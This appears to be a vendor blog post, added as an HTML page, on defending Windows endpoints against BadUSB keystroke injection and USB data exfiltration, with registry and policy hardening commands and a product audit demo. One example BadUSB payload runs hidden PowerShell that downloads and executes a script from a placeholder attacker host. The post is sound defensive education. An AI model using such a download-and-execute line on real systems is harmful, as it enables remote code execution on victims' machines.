@@ -1,0 +1,203 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>USB Device Control on Windows: Stopping BadUSB and Data Exfiltration at the Port — WinSentinel Blog</title>
+  <meta name="description" content="Removable media is still one of the most overlooked attack surfaces on Windows endpoints - from BadUSB keystroke injection to silent data exfiltration. Here's how USB attacks actually work, the registry and policy controls that lock the port down, and what WinSentinel's Device Control module audits." />
+  <meta name="theme-color" content="#0b0f17" />
+  <meta name="author" content="Saurav Bhattacharya" />
+  <meta property="og:title" content="USB Device Control on Windows: Stopping BadUSB and Data Exfiltration at the Port" />
+  <meta property="og:description" content="Removable media is still one of the most overlooked attack surfaces on Windows endpoints - from BadUSB keystroke injection to silent data exfiltration. Here's how USB attacks actually work, the registry and policy controls that lock the port down, and what WinSentinel's Device Control module audits." />
+  <meta property="og:type" content="article" />
+  <meta property="article:published_time" content="2026-06-30" />
+  <meta property="og:url" content="https://winsentinel.ai/blog/usb-device-control-on-windows-stopping-badusb-and-data-exfil" />
+  <meta property="og:image" content="https://winsentinel.ai/og/blog-usb-device-control-on-windows-stopping-badusb-and-data-exfil.png" />
+  <meta property="og:image:type" content="image/png" />
+  <meta property="og:image:width" content="1200" />
+  <meta property="og:image:height" content="630" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:image" content="https://winsentinel.ai/og/blog-usb-device-control-on-windows-stopping-badusb-and-data-exfil.png" />
+  <meta name="twitter:title" content="USB Device Control on Windows: Stopping BadUSB and Data Exfiltration at the Port" />
+  <meta name="twitter:description" content="Removable media is still one of the most overlooked attack surfaces on Windows endpoints - from BadUSB keystroke injection to silent data exfiltration. Here's how USB attacks actually work, the registry and policy controls that lock the port down, and what WinSentinel's Device Control module audits." />
+  <link rel="canonical" href="https://winsentinel.ai/blog/usb-device-control-on-windows-stopping-badusb-and-data-exfil" />
+  <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'%3E%3Cpath fill='%2338bdf8' d='M32 4 8 14v18c0 14 10 24 24 28 14-4 24-14 24-28V14L32 4Z'/%3E%3Cpath fill='%230b0f17' d='m28 38-7-7 3-3 4 4 11-11 3 3-14 14Z'/%3E%3C/svg%3E" />
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          fontFamily: {
+            mono: ['ui-monospace','SFMono-Regular','Menlo','Monaco','Consolas','monospace'],
+            sans: ['Inter','ui-sans-serif','system-ui','-apple-system','Segoe UI','Roboto','sans-serif'],
+          },
+          colors: {
+            ink: { 950: '#070a11', 900: '#0b0f17', 800: '#11161f', 700: '#1a2030' },
+          },
+        },
+      },
+    };
+  </script>
+  <style>
+    html { scroll-behavior: smooth; }
+    body { background: radial-gradient(1200px 600px at 50% -200px, #0e1a2d 0%, #070a11 60%, #070a11 100%); }
+    .prose h2 { color: #fff; font-size: 1.5rem; font-weight: 700; margin-top: 2rem; margin-bottom: 0.75rem; }
+    .prose h3 { color: #e2e8f0; font-size: 1.125rem; font-weight: 600; margin-top: 1.5rem; margin-bottom: 0.5rem; }
+    .prose p { color: #cbd5e1; line-height: 1.75; margin-bottom: 1rem; }
+    .prose code { color: #7dd3fc; background: rgba(56,189,248,.08); padding: 2px 6px; border-radius: 4px; font-size: 0.875em; }
+    .prose pre { background: #11161f; border: 1px solid rgba(255,255,255,.08); border-radius: 8px; padding: 1rem; overflow-x: auto; margin: 1rem 0; }
+    .prose pre code { background: none; padding: 0; color: #e2e8f0; }
+    .prose ul { list-style: disc; padding-left: 1.5rem; color: #cbd5e1; margin-bottom: 1rem; }
+    .prose li { margin-bottom: 0.25rem; }
+    .prose a { color: #38bdf8; text-decoration: underline; text-underline-offset: 2px; }
+    .prose a:hover { color: #7dd3fc; }
+    .prose blockquote { border-left: 3px solid #38bdf8; padding-left: 1rem; color: #94a3b8; font-style: italic; margin: 1rem 0; }
+  </style>
+  <script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "@id": "https://winsentinel.ai/blog/usb-device-control-on-windows-stopping-badusb-and-data-exfil",
+  "headline": "USB Device Control on Windows: Stopping BadUSB and Data Exfiltration at the Port",
+  "datePublished": "2026-06-30",
+  "dateModified": "2026-06-30",
+  "url": "https://winsentinel.ai/blog/usb-device-control-on-windows-stopping-badusb-and-data-exfil",
+  "mainEntityOfPage": "https://winsentinel.ai/blog/usb-device-control-on-windows-stopping-badusb-and-data-exfil",
+  "description": "Removable media is still one of the most overlooked attack surfaces on Windows endpoints - from BadUSB keystroke injection to silent data exfiltration. Here's how USB attacks actually work, the registry and policy controls that lock the port down, and what WinSentinel's Device Control module audits.",
+  "author": {
+    "@type": "Person",
+    "name": "Saurav Bhattacharya"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "WinSentinel",
+    "url": "https://winsentinel.ai",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://winsentinel.ai/og/default.svg"
+    }
+  },
+  "image": "https://winsentinel.ai/og/blog-usb-device-control-on-windows-stopping-badusb-and-data-exfil.png",
+  "isPartOf": {
+    "@type": "Blog",
+    "@id": "https://winsentinel.ai/blog",
+    "name": "WinSentinel Blog"
+  }
+}
+  </script>
+<!-- Cloudflare Web Analytics (cookieless). Token is set out-of-band; loader no-ops until configured. -->
+<script>window.__WS_CF_BEACON_TOKEN__ = "__CF_BEACON_TOKEN__";</script>
+<script defer src="/js/cf-analytics.js"></script>
+</head>
+<body class="font-sans text-slate-200 antialiased">
+
+<div id="site-header"></div>
+
+<article class="max-w-3xl mx-auto px-6 pt-14 pb-20">
+  <a href="/blog" class="text-sm text-sky-400 hover:text-sky-300">← All posts</a>
+  <time class="mt-8 block text-xs text-slate-500 uppercase tracking-wider">June 30, 2026</time>
+  <h1 class="mt-2 text-3xl md:text-4xl font-bold text-white leading-tight">USB Device Control on Windows: Stopping BadUSB and Data Exfiltration at the Port</h1>
+  <p class="mt-4 text-lg text-slate-300">Removable media is still one of the most overlooked attack surfaces on Windows endpoints - from BadUSB keystroke injection to silent data exfiltration. Here's how USB attacks actually work, the registry and policy controls that lock the port down, and what WinSentinel's Device Control module audits.</p>
+
+  <div class="prose mt-8">
+    <p>Every security program eventually obsesses over the network: firewalls, segmentation, TLS inspection, egress filtering. Meanwhile there is a physical port on the front of the machine that will trust almost anything you plug into it, run code as the logged-in user, and copy gigabytes off the box without a single packet crossing the perimeter. USB remains one of the most underestimated attack surfaces on Windows, and the tooling to abuse it costs less than lunch.</p>
+
+    <p>This post walks through the two categories of USB attack that matter, the Windows controls that actually stop them, and how to audit whether your endpoints are exposed right now.</p>
+
+    <h2>Two Threats Wearing the Same Connector</h2>
+
+    <h3>1. BadUSB — the keyboard that isn't a keyboard</h3>
+    <p>A USB device tells Windows what it is. A "Rubber Ducky," a flashed Arduino, or a malicious cable can declare itself a Human Interface Device (HID) — a keyboard — and Windows will load the generic HID driver with zero prompts, because keyboards are trusted by definition. From there the device "types" thousands of keystrokes per minute:</p>
+
+    <pre><code># What a BadUSB payload "types" the instant it's plugged in:
+GUI r                      # open the Run dialog
+powershell -w hidden -nop -c "iwr http://evil.host/a.ps1 | iex"
+ENTER</code></pre>
+
+    <p>There is no malware on a drive to scan, no autorun to disable. The device is an input peripheral, and the attack is just very fast typing. This is why "we block USB mass storage" is not the same as "we are safe from USB" — a HID attack never mounts a volume.</p>
+
+    <h3>2. Data exfiltration — the oldest trick that still works</h3>
+    <p>The other half is mundane and far more common: a mass-storage device shows up as a drive letter and someone drags a folder of customer records onto it. No exploit required. The Verizon DBIR has tracked physical-media exfiltration and "privilege misuse" for years; it is overwhelmingly an insider or careless-employee problem, not a movie-grade hack. A 256&nbsp;GB thumb drive can hold an entire database export and walk out in a pocket.</p>
+
+    <h2>The Controls That Actually Help</h2>
+    <p>Windows ships with everything you need to lock the port down — the controls are just buried and rarely set. Here are the ones worth knowing, roughly from blunt to surgical.</p>
+
+    <p><strong>Block removable storage outright.</strong> The cleanest lever for mass storage is the Removable Storage Access policy. Deny-all-read/write turns thumb drives into bricks while leaving keyboards and mice working:</p>
+
+    <pre><code># Deny read + write to all removable storage classes (per-machine)
+$rs = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\RemovableStorageDevices"
+New-Item -Path $rs -Force | Out-Null
+New-ItemProperty -Path $rs -Name "Deny_All" -Value 1 -PropertyType DWord -Force
+
+# Or stop the USB storage driver from starting at all (3 = manual, 4 = disabled)
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\USBSTOR" /v Start /t REG_DWORD /d 4 /f</code></pre>
+
+    <p><strong>Allow only known devices.</strong> A pure block is hard in the real world — people need their YubiKeys, badge readers, and approved encrypted drives. Device installation restrictions let you allowlist by hardware ID or device class while denying everything else:</p>
+
+    <pre><code># Find the hardware/instance IDs you want to allow
+Get-PnpDevice -Class USB | Select-Object FriendlyName, InstanceId, Status
+
+# Policy lives under:
+# HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceInstall\Restrictions
+#   DenyDeviceClasses / AllowDeviceIDs / DenyUnspecified = 1</code></pre>
+
+    <p><strong>Mitigate BadUSB specifically.</strong> Storage policy does nothing against a HID attack. The practical defenses are different: require explicit approval for newly attached input devices, deploy a "USB drop" detector that flags a keyboard appearing on a machine that already has one, and — most effective — train users that an unknown cable or "found" drive is hostile. Microsoft Defender for Endpoint's device control and ASR also reduce what a dropped payload can do once it "types."</p>
+
+    <p><strong>Audit, even where you don't block.</strong> Windows logs device arrivals. Enable the Plug and Play (PnP) and partition events and you get an immutable trail of every drive that ever touched the machine — invaluable after an incident, and a deterrent when people know it exists.</p>
+
+    <h2>What WinSentinel's Device Control Module Audits</h2>
+    <p>You can set all of the above by hand on one machine. The hard part is knowing the current state — which is exactly what an audit is for. WinSentinel's Device Control module inspects the live configuration and tells you, in plain language, where the port is open:</p>
+
+    <pre><code>$ winsentinel --audit --modules device-control
+
+ Device Control
+ ─────────────────────────────────────────────────────
+ [CRITICAL] USB mass storage is unrestricted
+   → USBSTOR start = 3 (manual); RemovableStorageDevices\Deny_All not set
+   → Any user can mount a thumb drive and copy data off this host
+
+ [WARNING]  Device installation allowlist not configured
+   → DenyUnspecified = 0 — unknown device classes install silently
+   → Fix: define AllowDeviceIDs for approved hardware, set DenyUnspecified = 1
+
+ [WARNING]  AutoRun / AutoPlay not fully disabled
+   → NoDriveTypeAutoRun = 0x95 (expected 0xFF)
+
+ [INFO]     PnP device-arrival auditing is OFF
+   → No event trail of attached removable media
+   → Enable: auditpol /set /subcategory:"PNP Activity" /success:enable
+
+ [INFO]     14 USB devices seen in device history
+   → 11 HID, 2 mass storage, 1 unknown vendor (review)</code></pre>
+
+    <p>Every finding is on-device and actionable: WinSentinel reads the same registry and policy keys an attacker would probe, then hands you the exact fix. This is core, single-machine hardening — and it is <strong>fully available in the free tier</strong>, like all 33 modules, with no limits. Free isn't a crippled demo; it's the complete audit engine on one box.</p>
+
+    <h2>Where Fleet Scale Changes the Problem</h2>
+    <p>One machine is a checklist. A hundred machines is a policy you can't trust until you've verified it everywhere. The questions change: <em>Which</em> endpoints still have <code>USBSTOR</code> enabled after we pushed the GPO? Did a new laptop ship with the allowlist missing? Did someone flip a key back last week?</p>
+
+    <p>That is the job of WinSentinel Pro's central node. Each agent runs the same Device Control audit locally, then rolls its results up so you get a fleet-wide view: a compliance rollup of which machines enforce removable-storage policy, and drift alerts the moment a previously-hardened endpoint regresses. The per-machine power is identical to Free — Pro adds the orchestration, aggregation, and continuous monitoring that orgs need to prove the control holds across the whole estate.</p>
+
+    <blockquote>The port on the front of the laptop trusts more than your firewall ever would. Audit it like you mean it.</blockquote>
+
+    <h2>Do This Today</h2>
+    <ul>
+      <li>Run <code>winsentinel --audit --modules device-control</code> and read the findings — most machines have at least one open.</li>
+      <li>If you don't need removable storage, deny it (<code>USBSTOR Start = 4</code>) and confirm keyboards/mice still work.</li>
+      <li>Build a hardware-ID allowlist for the devices you <em>do</em> need; set <code>DenyUnspecified = 1</code>.</li>
+      <li>Turn on PnP auditing so every future drive leaves a trail.</li>
+      <li>Treat unknown cables and "found" USB drives as hostile — because the cheap ones are.</li>
+    </ul>
+
+    <p>USB is the attack surface nobody schedules a meeting about. It doesn't need one — it just needs you to check the configuration once, fix what's open, and keep watching it. That's a five-minute audit on one machine, and a single dashboard across a fleet.</p>
+  </div>
+
+  <nav class="mt-16 pt-8 border-t border-white/10 flex items-center justify-between gap-6 text-sm text-slate-400">
+    <span></span>
+    <a href="/blog/llmnr-nbtns-poisoning-ntlm-relay" class="hover:text-white text-right">LLMNR and NBT-NS Poisoning: How One Misconfiguration Hands Over Your Credentials →</a>
+  </nav>
+</article>
+
+<div id="site-footer"></div>
+<script src="/components/nav.js"></script>
+</body>
+</html>
